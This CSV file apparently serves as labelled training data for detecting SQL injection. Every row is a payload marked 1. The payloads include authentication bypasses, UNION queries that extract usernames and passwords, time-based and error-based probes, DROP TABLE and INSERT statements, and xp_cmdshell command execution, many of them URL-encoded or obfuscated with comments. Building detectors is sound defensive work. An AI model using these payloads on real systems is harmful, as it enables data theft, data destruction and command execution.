Sentence,Label
'%20or%201=1# AND 1=1 AND 1=1 OR 1=1429845332181,1
"user' UNION SELECT NULL,NULL--# OR 1=1/*/*",1
"1';+INSERT+INTO+users+VALUES('hacked','pass')--517360",1
admin' UNION SELECT NULL-- AND 1=1#645 OR 1=1,1
"ADMIN""/*172247 AND 1=1380",1
user') OR 1=1-- AND 1=1882350307#--910,1
"admin"") OR 1=1----/* OR 1=1/*",1
'; WAITFOR DELAY '0:0:5'--/*455,1
'%20or%201=1#/*# OR 1=1512,1
"user"" OR ""1""=""1"" -- AND 1=1/*139",1
1%2527%2520AND%2520BENCHMARK%25285000000%252CMD5%2528%2527A%2527%2529%2529--309462/*919,1
"1"" AND SLEEP(10)--",1
useradmin' OR 1=1----776,1
'/**/OR/**/'a'='a922980622971--,1
admin%27%20OR%20%271%27%3D%27120 AND 1=140868/* AND 1=1823,1
1%27%20AND%20BENCHMARK%285000000%2CMD5%28%27A%27%29%29-- AND 1=1524536,1
1' OR '1' = '1 AND 1=1 OR 1=1/*846,1
"user"") OR (""1""=""1 OR 1=115",1
"admin"" UNION ALL SELECT NULL-- AND 1=1623",1
%27%20OR%20%271%27%3D%271%27%20-- OR 1=1 AND 1=1,1
admin' OR '1'='1' /* AND 1=1452##,1
"test"" OR 1=1##933102#/*986 OR 1=1570 OR 1=1",1
1%27%20AND%20BENCHMARK%285000000%2CMD5%28%27A%27%29%29-- AND 1=1524561,1
"1"" OR ""a""=""a AND 1=1--376--650658",1
1' UNION SELECT NULL----395991,1
' or 2=2----764,1
1'%20OR%201%20=%201575409713/*,1
1%27%3B%20DROP%20TABLE%20users--/*586 AND 1=1 OR 1=1348 AND 1=1,1
admin%27%20OR%20%271%27%3D%27120 AND 1=140868#,1
' AND 2=CAST((SELECT @@version) AS int)--#373,1
""";+EXEC+xp_cmdshell(""dir"")--## AND 1=1 AND 1=1/*",1
') OR ('1'='1/* OR 1=1--/*248182990,1
'; WAITFOR DELAY '0:0:10'-- AND 1=1,1
adminadmin' OR '1'='1/*--/*,1
""" OR ""2""=""2 AND 1=1 AND 1=1440",1
'/**/OR/**/'1'='1'/**/--/* AND 1=1,1
"testadmin"" OR 1=1-- AND 1=1502",1
"""%09UNION%09ALL%09SELECT%09NULL--477/*-- AND 1=1812 AND 1=1853657831",1
useradmin' OR 1=1-- AND 1=1257 AND 1=1,1
user' OR '1'='1#--452,1
'%20or%201=1--969 OR 1=1505,1
ADMIN'/* AND 1=1911,1
""";+EXEC+xp_cmdshell(""dir"")-- AND 1=1 AND 1=1/*374897",1
"1' UNION SELECT NULL,table_name FROM information_schema.tables-- AND 1=1 OR 1=1#",1
"user"" UNION SELECT NULL--/*58370 AND 1=1 AND 1=1921",1
user1' OR 1 = 1#,1
"99""; INSERT INTO users VALUES(""hacked"",""pass"")-- OR 1=1210784 OR 1=1--143",1
admin0x27/*467468972,1
')+OR+('1'='1346647,1
admin1' OR '1' = '1--/*/*814686,1
1' OR '1'='1' --/*612 AND 1=1#725 AND 1=1,1
1'%09AND%09pg_sleep(5)--860 OR 1=125816## AND 1=1,1
"admin"") OR (""1""=""1# OR 1=1/*230",1
"""%09UNION%09ALL%09SELECT%09NULL--477/*-- AND 1=1#892-- OR 1=1923 AND 1=1 OR 1=1",1
"1""%20UNION%20SELECT%20NULL,column_name%20FROM%20information_schema.columns-- OR 1=1838#",1
""" AND extractvalue(1,concat(0x7e,version()))--161272#",1
admin' OR 1=1#/*327634,1
"admin1"" OR ""1"" = ""1# OR 1=1/*67721905",1
1%27%3B%20DROP%20TABLE%20users--/*586,1
'/**/or/**/1=1/*925,1
"""+UNION+SELECT+NULL--608607",1
"99""; INSERT INTO users VALUES(""hacked"",""pass"")-- OR 1=1210784 OR 1=171638",1
"1"" OR ""a""=""a AND 1=1--376-- AND 1=1",1
""" or 2=2/* AND 1=1/*",1
"' AND 1=CONVERT(int,(SELECT @@version))-- AND 1=1953--#423/*--",1
""";+EXEC+xp_cmdshell(""dir"")--## AND 1=1--849--",1
1%27%20OR%20%271%27%20%3D%20%271/*191/*,1
1' OR '1'='1 OR 1=1257#233,1
"'/**/AND/**/extractvalue(1,concat(0x7e,version()))--761--/*#23028",1
admin' OR '1'='1' /* AND 1=1452 AND 1=1948,1
'%20or%201=1#/* OR 1=1 OR 1=1378423,1
2'--419,1
"1'; INSERT INTO users VALUES('hacked','pass')--739# AND 1=1487",1
"admin"" UNION SELECT 1,2,3-- AND 1=1957725289",1
test' UNION SELECT NULL-- AND 1=1/*,1
admin1' OR 1 = 1 AND 1=1-- AND 1=1#,1
"99"" OR 99 = 99 OR 1=1#/*5 OR 1=194",1
"test"" UNION SELECT NULL----#110",1
""" OR 1=1#----# AND 1=1-- AND 1=1876649",1
1' OR '1' = '1 AND 1=1 OR 1=1/*493,1
admin%2527-- OR 1=1,1
""" OR ""1""=""1 AND 1=1 OR 1=1 OR 1=1#",1
"ADMIN""/*172531363/*",1
1' OR 'a'='a OR 1=1/*,1
'%20or%201=1# AND 1=1 AND 1=1 OR 1=1429/*,1
"""%20or%201=1# AND 1=1 OR 1=1# AND 1=1644",1
1' OR '1'='1 OR 1=1257--57050396532,1
"user"") OR (""1""=""128 AND 1=1575",1
"admin' UNION SELECT NULL,NULL--897514154 OR 1=1 OR 1=183384",1
'%20or%201=1/*835257383135475,1
admin'/**/OR/**/1=1-- OR 1=1 AND 1=1,1
""" UNION SELECT USERNAME,PASSWORD FROM USERS--/* AND 1=1",1
admin0x27/* OR 1=1 AND 1=1298372,1
' UNION ALL SELECT NULL--/*,1
"test1"" UNION SELECT NULL,table_name FROM information_schema.tables-- AND 1=1----773865/*",1
"1"" OR ""1"" = ""1-- OR 1=1#256",1
""" AND extractvalue(1,concat(0x7e,version()))-- OR 1=1278583236288",1
1' UNION SELECT NULL----395225631,1
test' OR 1=1##/* OR 1=1-- OR 1=1--,1
admin'%20OR%20'1'='1 AND 1=1987 AND 1=129,1
%27%20UNION%20SELECT%20NULL--529338,1
0x27 UNION ALL SELECT NULL--415482965,1
1%27%20AND%20BENCHMARK%285000000%2CMD5%28%27A%27%29%29----520/*672,1
admin' UNION ALL SELECT NULL--24/*809,1
"admin"") OR (""1""=""1# OR 1=1601 AND 1=1576",1
"1' UNION SELECT 1,2,3-- AND 1=1952540680",1
"'%20UNION%20SELECT%20NULL,NULL,NULL--511138/*81 OR 1=1/*",1
"' union select null,null,null--# AND 1=1--491 OR 1=1510#",1
"1""%20UNION%20SELECT%20NULL,column_name%20FROM%20information_schema.columns-- OR 1=1 OR 1=1 OR 1=1370489",1
'/**/OR/**/'1'='1'/**/--282#985#--,1
"99"" AND BENCHMARK(5000000,MD5(""A""))-- OR 1=1878/*68",1
"'/**/AND/**/1=CONVERT(int,(SELECT/**/@@version))--# AND 1=168/*--",1
'%20or%201=1#/* OR 1=1 OR 1=1378/*,1
"1'; INSERT INTO users VALUES('hacked','pass')-- OR 1=1/*",1
' OR '2'='213/*#280,1
1' OR '1'='1' --/* OR 1=1--664,1
"'+UNION+SELECT+NULL,NULL-- OR 1=1",1
' OR 1=1#/*970,1
1' OR '1'='1' --#57 OR 1=1901 OR 1=1#,1
') OR ('1'='1/*255 AND 1=1,1
' OR '1'='1-- OR 1=1865,1
"1'/**/UNION/**/SELECT/**/NULL,table_name/**/FROM/**/information_schema.tables--819",1
""" OR 1=1#----# AND 1=1-- AND 1=1876241890",1
1';%09DROP%09TABLE%09users-- AND 1=1,1
"1""+OR+1+=+1351888894",1
%2527%2520or%25201%253D1/%252A--253363,1
"admin' UNION SELECT 1,2,3--#343451 AND 1=1",1
"' UNION SELECT NULL,NULL-- AND 1=1 OR 1=1311# OR 1=1198",1
0x27; DROP TABLE users--15261344,1
"99""; INSERT INTO users VALUES(""hacked"",""pass"")-- OR 1=1210958236--835",1
1'%09AND%09pg_sleep(5)--860 OR 1=1258--633,1
admin%27%20OR%20%271%27%3D%27120 AND 1=1928,1
admin0x27/* OR 1=1 AND 1=1298#,1
aDMin'/*170,1
"1""; INSERT INTO users VALUES(""hacked"",""pass"")--739-- OR 1=1--343284",1
'/**/OR/**/'1'='1'/**/--/*75905,1
"1"" UNION SELECT NULL,NULL------611--306493#352",1
""" AND extractvalue(1,concat(0x7e,version()))-- OR 1=1278583236 OR 1=1130",1
"""%09UNION%09ALL%09SELECT%09NULL--477/*-- AND 1=1#892-- OR 1=1923 OR 1=1--",1
admin1' OR '1' = '1--279# AND 1=1/*,1
"1"" OR ""1""=""1/* AND 1=1 OR 1=1/* OR 1=1497352931",1
'/**/OR/**/1=1-- OR 1=1 OR 1=1165418,1
"user"") OR (""1""=""1 AND 1=1626468956640",1
' UNION SELECT NULL--/*225,1
useradmin' OR 1=1----/*,1
"user"" OR 1=1/*/* AND 1=1/*/*257",1
"""+OR+""1""=""1--720201",1
""")+OR+(""1""=""1 AND 1=1875--",1
1' OR 1=1#-- AND 1=1807,1
"admin' UNION SELECT username,password FROM users-- AND 1=1910",1
"admin"" UNION SELECT NULL,NULL--897514154 OR 1=1 OR 1=1/*206",1
"1""%20AND%20pg_sleep(5)--533872287 OR 1=1124 OR 1=1",1
"1"" OR ""1""=""1/* AND 1=1 OR 1=1/*/*--",1
10x27; WAITFOR DELAY 0x2700:00:050x27----928511,1
admin' UNION ALL SELECT NULL-- AND 1=111/* OR 1=1,1
"""%20UNION%20ALL%20SELECT%20NULL--908#/*",1
' AND 2=CAST((SELECT @@version) AS int)--# AND 1=1/*829,1
""";+EXEC+xp_cmdshell(""dir"")--## AND 1=1670",1
11' OR 1 = 1/*116,1
1admin' OR 1=1--#951359564,1
"'%20UNION%20SELECT%20NULL,NULL,NULL----#712563",1
"admin' UNION SELECT NULL,NULL--897514705",1
'%20or%201=1#/*119 AND 1=1,1
admin' UNION ALL SELECT NULL-- AND 1=1-- OR 1=1225,1
' AND 1=CAST((SELECT @@version) AS int)--/*423848 OR 1=1,1
"""%20UNION%20ALL%20SELECT%20NULL--108 AND 1=1438",1
"' union select null,null,null--860 AND 1=1",1
"ADMIN""/*172871160",1
%2527%2520AND%25201%253DCAST%2528%2528SELECT%2520%2540%2540version%2529%2520AS%2520int%2529--#,1
"admin' UNION SELECT NULL,NULL--#122347",1
' OR '2'='213/*10375--,1
admin' UNION SELECT NULL-- AND 1=1#645/*735 AND 1=1/*476860--,1
user' OR 1=1/*/* AND 1=1448#,1
"test' UNION SELECT 1,2,3-- OR 1=157443",1
10x27; WAITFOR DELAY 0x2700:00:050x27-- AND 1=1728720,1
' OR 1=1#----#401,1
"99'; INSERT INTO users VALUES('hacked','pass')--372816#--252/*",1
2' OR 2 = 2--730/*255,1
"' UNION SELECT NULL,NULL-- AND 1=1 OR 1=1189 OR 1=1 AND 1=1/*174",1
"99'; INSERT INTO users VALUES('hacked','pass')-- OR 1=1210958688323",1
1' and pg_sleep(5)-- AND 1=1,1
"user"" OR ""a""=""a--920",1
"' UNION SELECT NULL,NULL-- AND 1=1 OR 1=1311--598669856",1
"""+OR+1=1--156/*437",1
' OR 1=1#-- OR 1=1#988,1
test1' OR '1' = '1 AND 1=152/*,1
"admin"") OR (""1""=""1# OR 1=1601 AND 1=1815 OR 1=19",1
user') OR 1=1-- AND 1=1325 AND 1=167#643106,1
"1"") OR 1=1----",1
') OR ('1'='1/* AND 1=1967#940,1
user' UNION SELECT NULL-- AND 1=14863936,1
admin' UNION SELECT NULL-- AND 1=1#645/* OR 1=1431580,1
0x27; DROP TABLE users--15#701 OR 1=1 AND 1=1,1
"'%09AND%09updatexml(1,concat(0x7e,version()),1)--#79",1
"1' UNION SELECT 1,2,3-- AND 1=1952 AND 1=1268 OR 1=1",1
admin' OR 1=1#/*120637/*637--,1
%2527%2520OR%25201%253D1/%252A--466,1
admin' OR '1'='1 AND 1=1998826/*,1
' or 2=2--#/*,1
admin' UNION SELECT NULL-- AND 1=1#36 OR 1=1245,1
1%27--#,1
'; update users set password='hacked'-- AND 1=1770,1
1'%20OR%201%20=%201423,1
"' UNION SELECT NULL,NULL-- AND 1=1 OR 1=1189 OR 1=1 AND 1=1871826",1
"' union select null,null,null--# AND 1=1--491#--",1
'/**/OR/**/'1'='1'/**/--/*75136,1
2' OR '2' = '2163254#820145--,1
"'/**/AND/**/1=CONVERT(int,(SELECT/**/@@version))--138229",1
'/**/OR/**/'1'='1'/**/-- OR 1=157551881,1
""" UNION SELECT NULL,NULL-- AND 1=1 OR 1=1311--198/*",1
""" AND extractvalue(1,concat(0x7e,version()))-- OR 1=1278583#",1
"admin1"" OR ""1"" = ""1# OR 1=1/*#",1
%27%20UNION%20SELECT%20username%2Cpassword%20FROM%20users--#,1
"1""----101 AND 1=1",1
' or 2=2/* AND 1=1/*700,1
admin0x27/* OR 1=1 AND 1=1298542,1
"user' UNION SELECT NULL,NULL,NULL--805 OR 1=1 AND 1=1558",1
"1'; INSERT INTO users VALUES('hacked','pass')--739822#",1
"1"" UNION SELECT NULL,NULL------611-- OR 1=1696/*",1
"""%09UNION%09SELECT%09NULL,NULL--21500 OR 1=1 OR 1=1799350977 AND 1=1185",1
"user"" UNION SELECT NULL--/*58370 AND 1=1 AND 1=1/*",1
' UNION SELECT NULL--/*622/*427/*515 OR 1=1421,1
"1"" UNION SELECT NULL----159334593107 AND 1=1 OR 1=1 AND 1=1 AND 1=1",1
"1"" OR 1=1/*#380199",1
""";+EXEC+xp_cmdshell(""dir"")--## AND 1=1546",1
"user"" UNION SELECT NULL--/*844120",1
ADMIN'/* AND 1=1911 AND 1=110515794146,1
1%27%3B%20DROP%20TABLE%20users--,1
1'%09OR%09'1'%09=%09'1998/*804,1
ADMIN'/*172620 OR 1=1116471,1
"admin"" OR 1=1-- OR 1=1 AND 1=1905",1
"""/**/OR/**/""1""=""1""/**/-- OR 1=1",1
') OR ('1'='1/* OR 1=1--/*88573,1
"1"" UNION SELECT NULL,NULL------611-- OR 1=1 OR 1=1 OR 1=1",1
2' OR '2' = '2163254# AND 1=1,1
0x27; DROP TABLE users--15306,1
"1"" UNION SELECT NULL----395/* AND 1=1228931224",1
"user' UNION SELECT 1,2,3-- AND 1=1809 AND 1=1",1
%27%20or%201%3D1%23823139,1
'; update users set password='hacked'-- AND 1=1163,1
' OR '2'='2 AND 1=1,1
""" AND extractvalue(1,concat(0x7e,version()))--161/*233780",1
"""/**/AND/**/1=CONVERT(int,(SELECT/**/@@version))--138585",1
"1"" UNION SELECT NULL,NULL------611-- OR 1=1--377 OR 1=1989106846",1
'+OR+1=1#/*/*#,1
"""; UPDATE USERS SET PASSWORD=""HACKED""-- AND 1=1",1
' or 2=2--360,1
"' UNION SELECT NULL,NULL-- AND 1=1 OR 1=1189 OR 1=1883 AND 1=1",1
admin' OR '99'='99 OR 1=171348,1
"admin' UNION SELECT 1,2,3--#343451--536 AND 1=1",1
admin'%20OR%20'1'='1 AND 1=1987656875,1
"admin' UNION SELECT 1,2,3--#343451--960",1
1' OR 1=1#-- AND 1=1603204,1
99' AND SLEEP(5)----,1
1'%20OR%20'1'%20=%20'1918 OR 1=1,1
user' OR 1=1/*/* AND 1=1--118--,1
"useradmin"" OR ""1""=""1-- OR 1=1161#",1
10x27; WAITFOR DELAY 0x2700:00:050x27----928753 AND 1=1,1
testadmin' OR '1'='1#624648,1
10x27; WAITFOR DELAY 0x2700:00:050x27----#,1
"""%20or%201=1--969 OR 1=1/*",1
' OR '1'='1' /*# OR 1=1,1
' or 1=1--73# AND 1=1,1
"admin"" UNION ALL SELECT NULL--24127474161706",1
2' AND SLEEP(5)----232/*,1
1';+DROP+TABLE+users--,1
"1' UNION SELECT NULL,table_name FROM information_schema.tables-- AND 1=1 AND 1=1# AND 1=1",1
"""%20or%201=1-- OR 1=1--564",1
admin0x27/* OR 1=1 AND 1=1955608/*,1
testadmin' OR '1'='1##,1
' OR '2'='213792,1
"admin' UNION SELECT NULL,NULL,NULL--/*# AND 1=166556590--",1
"99"" OR 99 = 99 OR 1=1#/*5-- AND 1=1",1
""" AND extractvalue(1,concat(0x7e,version()))--161272 AND 1=1",1
useradmin' OR 1=1----7,1
"' union select null,null,null--748/*--",1
"' UNION SELECT NULL,NULL-- AND 1=1 OR 1=1189 OR 1=1 AND 1=1290#",1
"admin"" UNION SELECT NULL,NULL--897",1
"""%09UNION%09SELECT%09NULL,NULL-- OR 1=1577",1
"'/**/AND/**/1=CONVERT(int,(SELECT/**/@@version))--# AND 1=168 AND 1=1",1
' OR '2'='2/*785/*371,1
1' UNION SELECT NULL---- AND 1=1 AND 1=1,1
'/**/OR/**/'1'='1'/**//*589 OR 1=1 AND 1=1776,1
"1'; INSERT INTO users VALUES('hacked','pass')--739 AND 1=1567#",1
test' OR 1=1#/* OR 1=1,1
admin' OR '1'='1' /*307,1
"1""%20UNION%20SELECT%20NULL,column_name%20FROM%20information_schema.columns--/* OR 1=1## OR 1=1679664154",1
2'; DROP TABLE users--713 OR 1=1,1
'%20or%201=1/*83525738383394824,1
1'/**/AND/**/SLEEP(5)--336442,1
') OR ('2'='2 OR 1=1290 OR 1=1505 OR 1=1,1
"admin"" UNION SELECT NULL,NULL,NULL--/*41059",1
""";+EXEC+xp_cmdshell(""dir"")-- AND 1=1--247173",1
1%27%3B%20DROP%20TABLE%20users--/*586 AND 1=1 OR 1=1348154600,1
user1' OR '1' = '1659 OR 1=1,1
1'----101--/*222,1
admin'/**/OR/**/1=1-- OR 1=1402871,1
"""/**/UNION/**/SELECT/**/NULL,NULL,NULL--306889482",1
1'%20AND%20pg_sleep(5)--533 AND 1=1,1
'%20or%201=1/*83525738383159550,1
"user"" UNION SELECT NULL,NULL--#",1
11' OR 1 = 1 AND 1=1 OR 1=1,1
"99'; INSERT INTO users VALUES('hacked','pass')--37281667 AND 1=1",1
admin' OR 1=1--#,1
test' OR '1'='1' /*#/*--95,1
"1"" UNION SELECT NULL----159334593107538",1
""";+EXEC+xp_cmdshell(""dir"")--## AND 1=1--849#",1
"1'%20UNION%20SELECT%20NULL,table_name%20FROM%20information_schema.tables--408298--314",1
"' UNION SELECT NULL,NULL-- AND 1=1 OR 1=1311# OR 1=1#927#160",1
"user"") OR 1=1-- AND 1=1/* OR 1=1223",1
';%20EXEC%20xp_cmdshell('dir')--# AND 1=1202/* OR 1=1791301850 AND 1=1,1
admin'%20OR%20'1'='1 AND 1=1987354,1
0x27) OR 1=1--# AND 1=1-- AND 1=1,1
"1'%09UNION%09SELECT%09NULL,column_name%09FROM%09information_schema.columns--600925",1
"test"" UNION SELECT NULL,NULL--/*97855822",1
"user' UNION SELECT NULL,NULL--# OR 1=1#802",1
"admin"" UNION SELECT NULL,NULL--897514154 OR 1=1#170",1
1'%20OR%201%20=%201 OR 1=1,1
' UNION SELECT NULL--/*622/*427/*256407,1
1admin' OR '1'='1/*,1
1'/**/AND/**/pg_sleep(5)--#,1
1' OR '1'='1' /* AND 1=1 OR 1=1,1
""" OR ""1""=""1 AND 1=1 OR 1=1--",1
"""%20or%201=1#428/* OR 1=1857139",1
"""%20or%201=1# AND 1=1 OR 1=1447888",1
""" UNION SELECT username,password FROM users--461101",1
%2527%2520OR%25201%253D1/%252A--4 OR 1=1#,1
"1""%20UNION%20SELECT%20NULL,column_name%20FROM%20information_schema.columns--#/* AND 1=1----",1
%27%20OR%201%3D1%2F%2A/*--,1
"test"" UNION ALL SELECT NULL-- OR 1=1316",1
"1"" UNION SELECT username,password FROM users-- AND 1=1",1
1' OR '1'='1' --#412640681798976,1
';%20SELECT%20SLEEP(5)--/*,1
"1""%20OR%20""1""%20=%20""1918",1
1' UNION SELECT NULL----159676 OR 1=1,1
') OR ('1'='1/*839,1
user' OR 1=1/*/* AND 1=1/*/*#9,1
"99'; INSERT INTO users VALUES('hacked','pass')--372816# AND 1=1",1
10x27; WAITFOR DELAY 0x2700:00:050x27----928571,1
"admin"") OR (""1""=""1# OR 1=160148 OR 1=1",1
';%20EXEC%20xp_cmdshell('dir')--,1
"""/**/OR/**/1=1-- OR 1=1 OR 1=1/*",1
admin' UNION ALL SELECT NULL-- AND 1=1--588,1
%2527%2520or%25201%253D1/%252A523--,1
"""%09UNION%09ALL%09SELECT%09NULL--477/*-- AND 1=1# OR 1=1",1
' or 2=2--#197,1
"99'; INSERT INTO users VALUES('hacked','pass')--372816#--996",1
admin') OR 1=1--# AND 1=1580346,1
"10x27; INSERT INTO users VALUES(0x27hacked0x27,0x27pass0x27)--#205",1
"admin"" OR 1=1-- OR 1=1",1
user' OR '1'='1' -- AND 1=1/*--#,1
"99""; INSERT INTO users VALUES(""hacked"",""pass"")-- OR 1=1210784 OR 1=1379198",1
"user' UNION SELECT username,password FROM users----506157",1
' OR '1'='1--322#,1
"1""; INSERT INTO users VALUES(""hacked"",""pass"")--739####77",1
' OR '2'='213 AND 1=1/* OR 1=1,1
"""%20or%201=1/*835 OR 1=1 OR 1=1838",1
'+OR+'1'='1--/*417,1
"1""; INSERT INTO users VALUES(""hacked"",""pass"")--739-- OR 1=1--343905",1
""" OR 1=1#-- OR 1=1861",1
ADMIN'/* AND 1=1----/*,1
test' OR '1'='1' --714132--,1
"2"" AND SLEEP(5)--76181",1
"ADMIN""/*172247/*309363",1
"""%20AND%20extractvalue(1,concat(0x7e,version()))------",1
1%27%20AND%20BENCHMARK%285000000%2CMD5%28%27A%27%29%29----520/* OR 1=1,1
';%20EXEC%20xp_cmdshell('dir')--591 AND 1=1108/* OR 1=1742#,1
'; DROP TABLE users--801 OR 1=1,1
"1""+UNION+SELECT+NULL,table_name+FROM+information_schema.tables-- AND 1=1 AND 1=1875",1
"1"" UNION SELECT NULL,NULL------611--213 OR 1=1#",1
user' OR '1'='1# OR 1=1,1
"1"" UNION SELECT NULL----395129",1
""" OR ""1""=""1 AND 1=1--",1
1'; WAITFOR DELAY '00:00:010'--866-- AND 1=1429117,1
"1"";%20WAITFOR%20DELAY%20""00:00:05""--12--",1
admin' OR 1=1-- OR 1=1199 OR 1=1,1
"""%09UNION%09SELECT%09NULL,NULL--21500 OR 1=1 OR 1=1799350977 AND 1=1633",1
"useradmin"" OR 1=1--#540",1
1' OR 'a'='a544#80 AND 1=1426,1
' OR '1'='1#474225436,1
"1"" OR ""1"" = ""1-- OR 1=1197",1
"test' UNION SELECT 1,2,3--/*#974 OR 1=1#75 AND 1=1616327",1
"testadmin"" OR 1=1-- AND 1=1 AND 1=1#",1
""" OR ""2""=""213/*#942 OR 1=1#",1
' or 1=1-- AND 1=1,1
%27%20AND%201%3DCONVERT%28int%2C%28SELECT%20%40%40version%29%29--184993,1
admin' UNION SELECT NULL-- AND 1=1#645/*735 AND 1=1/*476860/*717,1
"1';%09INSERT%09INTO%09users%09VALUES('hacked','pass')--319562",1
"""+OR+""1""=""1--959 OR 1=1627",1
' or 1=1--73 AND 1=1,1
"""%20or%201=1#667--797",1
"user"") OR (""1""=""1--#",1
"1'; INSERT INTO users VALUES('hacked','pass')--739--353#612/*",1
"1'%09AND%09BENCHMARK(5000000,MD5('A'))--",1
';%20EXEC%20xp_cmdshell('dir')--591 AND 1=1108/*398,1
%2527%2529%2520OR%2520%2528%25271%2527%253D%25271--# OR 1=1462,1
"1"" UNION SELECT NULL----159334239248--",1
2'; DROP TABLE users--796,1
"1""%20UNION%20SELECT%20NULL,column_name%20FROM%20information_schema.columns-- OR 1=1 OR 1=1--",1
1' OR 'a'='a544#80 AND 1=170,1
user' OR '1'='1' -- AND 1=1/*/*734,1
"1"" OR ""a""=""a AND 1=1--376517738",1
"1"" UNION SELECT NULL,NULL------611--/*--",1
""" UNION SELECT 1,2,3--/*/*",1
"""/**/UNION/**/SELECT/**/NULL,NULL,NULL--306300/*",1
' OR '2'='213/*#942894,1
test' UNION SELECT NULL----217,1
""" OR ""1""=""1"" /*#",1
user' UNION SELECT NULL--/*#697,1
"admin"" OR ""1""=""195862624--",1
admin' UNION ALL SELECT NULL--892/*419,1
"1""; INSERT INTO users VALUES(""hacked"",""pass"")--739-- OR 1=1--343707",1
"1"" UNION SELECT NULL----395133",1
test' OR '1'='1' /*#666--782 OR 1=1,1
""" union select null,null,null--860 AND 1=1# AND 1=1310",1
test' OR 1=1#/*#/* OR 1=1,1
admin'%20OR%20'1'='1 AND 1=1987656414/*,1
admin0x27/*467468 OR 1=1708576,1
%2527%2520OR%25201%253D1/%252A516615,1
'%09OR%09'1'='1/*/*526,1
"admin"" UNION SELECT NULL,NULL,NULL--/*#444",1
1%27%3B%20INSERT%20INTO%20users%20VALUES%28%27hacked%27%2C%27pass%27%29--#838,1
"'%20UNION%20SELECT%20NULL,NULL,NULL--511138729 OR 1=1114",1
"99"" OR 99 = 99 OR 1=1#/*5--750",1
"""/**/UNION/**/SELECT/**/NULL,NULL,NULL--/*/*",1
1'%20AND%20pg_sleep(5)--533872437458988 OR 1=1,1
"1"" UNION SELECT 1,2,3-- AND 1=1----8447--580295",1
"admin"") OR 1=1--# AND 1=1580",1
10x27; WAITFOR DELAY 0x2700:00:050x27----928 AND 1=1/*--528 OR 1=1,1
user' OR '1'='1#315-- AND 1=1/*68448,1
' UNION SELECT NULL--/*622/*42723926107,1
10x27 AND pg_sleep(5)--##,1
' OR 99=99#--,1
"test"" UNION SELECT NULL,NULL--/* AND 1=1558",1
0x27 UNION ALL SELECT NULL--415482/*#60133,1
"admin1"" OR ""1"" = ""1# AND 1=1#785489383#454",1
"1'%20UNION%20SELECT%20NULL,column_name%20FROM%20information_schema.columns--/* OR 1=1## OR 1=1604",1
"'/**/AND/**/extractvalue(1,concat(0x7e,version()))--761--/*##504236",1
1' OR 'a'='a544#80 AND 1=1592,1
"""; UPDATE USERS SET PASSWORD=""HACKED""--69164 OR 1=1#346",1
""" OR ""1""=""1--322852661--/*",1
"' UNION SELECT NULL,NULL-- AND 1=1 OR 1=1189 OR 1=1 AND 1=1848",1
"ADMIN""/*172871638661138",1
';+EXEC+xp_cmdshell('dir')-- AND 1=1471810,1
""";+EXEC+xp_cmdshell(""dir"")-- AND 1=1 AND 1=1291 AND 1=1",1
admin' OR 1=1/*--863 AND 1=1 AND 1=1673495,1
') OR ('1'='1/* OR 1=1293/*,1
admin' OR 1=1-- AND 1=1173 OR 1=1,1
%27%20OR%20%271%27%3D%271%27%20-- OR 1=1462,1
1' OR 'a'='a544/*606891,1
"1""%20UNION%20SELECT%20NULL,column_name%20FROM%20information_schema.columns--/* OR 1=1## OR 1=1889141 OR 1=1875",1
"' UNION SELECT NULL,NULL-- AND 1=1",1
"admin"" OR ""1""=""1"" /* AND 1=1452#--",1
"test' UNION SELECT 1,2,3--/*#974#754472",1
"admin1"" OR ""1"" = ""1--/* OR 1=1",1
"""/**/OR/**/1=1-- OR 1=1876--/*--417667--",1
11' OR '1' = '1/*625,1
"'%09UNION%09SELECT%09NULL,NULL--21500 OR 1=1 OR 1=1799178",1
"'+UNION+SELECT+username,password+FROM+users--",1
1' OR '1' = '1-- AND 1=1304,1
""")+OR+(""1""=""1 AND 1=1875#34255",1
"ADMIN""/*172247/*79994",1
test' OR 1=1#/*#889--89,1
' OR '1'='1' ----952,1
"99"" AND BENCHMARK(5000000,MD5(""A""))-- OR 1=1--",1
'%20or%201=1#667-- AND 1=1,1
'%20or%201=1# AND 1=1 AND 1=1 OR 1=1429845332 OR 1=1,1
1' OR 'a'='a544#80 AND 1=1--,1
admin') OR 1=1----774#304--,1
"1"" OR ""1""=""1"" --/*612 AND 1=1--/*",1
user' OR 1=1--/* OR 1=178611,1
'/**/OR/**/1=1-- OR 1=1876--/*--417256,1
"""/**/OR/**/1=1-- OR 1=1876703",1
'/**/OR/**/'1'='1'/**/--413 AND 1=1,1
admin' UNION ALL SELECT NULL-- AND 1=1474 AND 1=1,1
' OR '2'='2 OR 1=1468 OR 1=1,1
' or 2=2/*36752/*,1
admin%27%20OR%20%271%27%3D%27120 AND 1=140868503,1
